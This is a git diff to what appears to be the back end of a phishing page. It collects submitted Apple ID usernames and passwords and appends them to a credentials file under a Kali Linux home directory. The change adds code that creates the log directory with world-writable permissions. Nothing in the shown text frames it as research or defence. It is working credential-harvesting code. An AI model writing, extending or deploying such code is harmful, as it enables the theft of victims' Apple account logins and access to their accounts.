@@ -4,8 +4,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $apple_id = htmlspecialchars($_POST['apple-id']);
     $password = htmlspecialchars($_POST['password']);
 
-    // Define the absolute path to the credentials file
-    $file_path = "/home/kali/Clifty/logs/credentials.txt";
+    // Define the path to the credentials file
+    $directory = "/home/kali/Clifty/logs/";
+    $file_path = $directory . "credentials.txt";
+
+    // Ensure the directory exists
+    if (!file_exists($directory)) {
+        mkdir($directory, 0777, true);
+    }
 
     // Save the credentials to the file
     $file = fopen($file_path, "a");
